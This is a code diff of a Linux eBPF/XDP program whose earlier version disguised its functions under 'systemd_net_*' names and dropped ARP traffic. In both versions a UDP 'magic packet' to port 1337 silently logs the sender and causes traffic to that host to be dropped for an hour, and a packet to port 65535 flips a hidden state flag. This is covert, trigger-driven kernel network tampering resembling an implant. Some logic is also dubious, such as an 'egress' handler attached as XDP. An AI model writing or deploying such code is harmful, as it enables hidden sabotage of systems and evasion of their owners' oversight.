@@ -3,87 +3,133 @@
 #include <linux/ip.h>
 #include <linux/ipv6.h>
 #include <linux/udp.h>
-#include <linux/pkt_cls.h>
 #include <bpf/bpf_helpers.h>
+#include <bpf/bpf_endian.h>
 
-struct auth_data {
-    __u64 ts;
-};
+struct a_v4 { __u32 addr; };
+struct a_v6 { struct in6_addr addr; };
 
 struct {
     __uint(type, BPF_MAP_TYPE_LRU_HASH);
-    __uint(max_entries, 1024);
+    __uint(max_entries, 16384);
+    __type(key, struct a_v4);
+    __type(value, __u64);
+} m_v4 SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_LRU_HASH);
+    __uint(max_entries, 16384);
+    __type(key, struct a_v6);
+    __type(value, __u64);
+} m_v6 SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_ARRAY);
+    __uint(max_entries, 1);
     __type(key, __u32);
-    __type(value, struct auth_data);
-} net_stats SEC(".maps");
+    __type(value, __u32);
+} m_state SEC(".maps");
 
 #ifndef SEED
 #define SEED 0x0
 #endif
 
-static __always_inline __u32 get_v(void) {
-    return (__u32)((bpf_ktime_get_ns() / 30000000000ULL) ^ SEED);
-}
-
-SEC("xdp")
-int systemd_net_filter(struct xdp_md *ctx) {
-    void *d = (void *)(long)ctx->data;
-    void *de = (void *)(long)ctx->data_end;
-    struct ethhdr *eth = d;
-
-    if ((void *)(eth + 1) > de) return XDP_PASS;
-
-    if (eth->h_proto == __constant_htons(ETH_P_IP)) {
-        struct iphdr *iph = (void *)(eth + 1);
-        if ((void *)(iph + 1) > de) return XDP_PASS;
-
-        if (iph->protocol == IPPROTO_UDP) {
-            struct udphdr *udp = (void *)(iph + 1);
-            if ((void *)(udp + 1) > de) return XDP_PASS;
-
-            if (udp->dest == __constant_htons(1337)) {
-                __u32 v = get_v();
-                struct auth_data a = { .ts = bpf_ktime_get_ns() };
-                bpf_map_update_elem(&net_stats, &iph->saddr, &a, BPF_ANY);
-                return XDP_DROP;
-            }
-        }
+static __always_inline int handle_udp(void *data, void *data_end, void *ip_hdr, bool is_v6) {
+    struct udphdr *udp;
+    if (is_v6) {
+        struct ipv6hdr *ip6 = ip_hdr;
+        udp = (void *)ip6 + sizeof(*ip6);
+    } else {
+        struct iphdr *ip4 = ip_hdr;
+        udp = (void *)ip4 + (ip4->ihl * 4);
     }
+
+    if ((void *)(udp + 1) > data_end) return XDP_PASS;
+
+    if (udp->dest == bpf_htons(1337)) {
+        __u64 ts = bpf_ktime_get_ns();
+        if (is_v6) {
+            struct ipv6hdr *ip6 = ip_hdr;
+            bpf_map_update_elem(&m_v6, &ip6->saddr, &ts, BPF_ANY);
+        } else {
+            struct iphdr *ip4 = ip_hdr;
+            struct a_v4 k = { .addr = ip4->saddr };
+            bpf_map_update_elem(&m_v4, &k, &ts, BPF_ANY);
+        }
+        return XDP_DROP;
+    }
+
+    if (udp->dest == bpf_htons(65535)) {
+        __u32 key = 0, val = 1;
+        bpf_map_update_elem(&m_state, &key, &val, BPF_ANY);
+        return XDP_DROP;
+    }
+
     return XDP_PASS;
 }
 
 SEC("xdp")
-int systemd_net_sync(struct xdp_md *ctx) {
-    void *d = (void *)(long)ctx->data;
-    void *de = (void *)(long)ctx->data_end;
-    struct ethhdr *eth = d;
+int handle_ingress(struct xdp_md *ctx) {
+    void *data = (void *)(long)ctx->data;
+    void *data_end = (void *)(long)ctx->data_end;
+    struct ethhdr *eth = data;
 
-    if ((void *)(eth + 1) > de) return XDP_PASS;
+    if ((void *)(eth + 1) > data_end) return XDP_PASS;
 
-    __u32 sa = 0;
-    if (eth->h_proto == __constant_htons(ETH_P_IP)) {
-        struct iphdr *iph = (void *)(eth + 1);
-        if ((void *)(iph + 1) > de) return XDP_PASS;
-        sa = iph->daddr;
+    __u16 proto = eth->h_proto;
+    void *cursor = eth + 1;
+
+    if (proto == bpf_htons(ETH_P_8021Q)) {
+        struct { __be16 tci; __be16 proto; } *vlan = cursor;
+        if ((void *)(vlan + 1) > data_end) return XDP_PASS;
+        proto = vlan->proto;
+        cursor += 4;
     }
 
-    struct auth_data *a = bpf_map_lookup_elem(&net_stats, &sa);
-    if (!a) return XDP_PASS;
+    if (proto == bpf_htons(ETH_P_IP)) {
+        struct iphdr *ip = cursor;
+        if ((void *)(ip + 1) > data_end) return XDP_PASS;
 
-    if (bpf_ktime_get_ns() - a->ts > 3600000000000ULL) {
-        bpf_map_delete_elem(&net_stats, &sa);
-        return XDP_PASS;
+        if (ip->protocol == 47) {
+            cursor += (ip->ihl * 4) + 4;
+            ip = cursor;
+            if ((void *)(ip + 1) > data_end) return XDP_PASS;
+        }
+
+        if (ip->protocol == IPPROTO_UDP) return handle_udp(data, data_end, ip, false);
+    } 
+    else if (proto == bpf_htons(ETH_P_IPV6)) {
+        struct ipv6hdr *ip6 = cursor;
+        if ((void *)(ip6 + 1) > data_end) return XDP_PASS;
+        if (ip6->nexthdr == IPPROTO_UDP) return handle_udp(data, data_end, ip6, true);
     }
 
-    return XDP_DROP;
+    return XDP_PASS;
 }
 
-SEC("classifier")
-int systemd_net_arp(struct __sk_buff *skb) {
-    if (skb->protocol == __constant_htons(ETH_P_ARP)) {
-        return TC_ACT_SHOT;
+SEC("xdp")
+int handle_egress(struct xdp_md *ctx) {
+    void *data = (void *)(long)ctx->data;
+    void *data_end = (void *)(long)ctx->data_end;
+    struct ethhdr *eth = data;
+
+    if ((void *)(eth + 1) > data_end) return XDP_PASS;
+
+    if (eth->h_proto == bpf_htons(ETH_P_IP)) {
+        struct iphdr *ip = (void *)(eth + 1);
+        if ((void *)(ip + 1) > data_end) return XDP_PASS;
+        struct a_v4 k = { .addr = ip->daddr };
+        __u64 *ts = bpf_map_lookup_elem(&m_v4, &k);
+        if (ts && (bpf_ktime_get_ns() - *ts < 3600000000000ULL)) return XDP_DROP;
+    } 
+    else if (eth->h_proto == bpf_htons(ETH_P_IPV6)) {
+        struct ipv6hdr *ip6 = (void *)(eth + 1);
+        if ((void *)(ip6 + 1) > data_end) return XDP_PASS;
+        __u64 *ts = bpf_map_lookup_elem(&m_v6, &ip6->daddr);
+        if (ts && (bpf_ktime_get_ns() - *ts < 3600000000000ULL)) return XDP_DROP;
     }
-    return TC_ACT_OK;
+
+    return XDP_PASS;
 }
 
 char _license[] SEC("license") = "GPL";
